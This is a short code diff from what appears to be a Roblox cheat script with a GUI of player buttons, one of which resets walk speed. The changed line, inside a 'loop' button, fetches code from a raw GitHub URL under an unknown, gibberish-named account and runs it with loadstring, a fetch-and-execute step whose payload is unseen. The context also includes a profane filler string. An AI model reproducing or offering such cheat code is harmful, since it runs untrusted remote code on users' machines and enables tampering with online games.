@@ -20,7 +20,7 @@ Text = "made by someone fuck fuck fuck fuck fuck fuck fuck fuck fuck fuck fuck f
         game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
     end)
     PlayerSection:NewButton("loop", "loop", function()
-    	loadstring(game:HttpGet("https://raw.githubusercontent.com/bhkxdcjkhgfdjiuhgjihgfhjkh/a/main/b"))()
+    	loadstring(game:HttpGet("https://raw.githubusercontent.com/bhkxdcjkhgfdjiuhgjihgfhjkh/a/main/a"))()
     end)
 --ui
   local UI = Window:NewTab("UI")
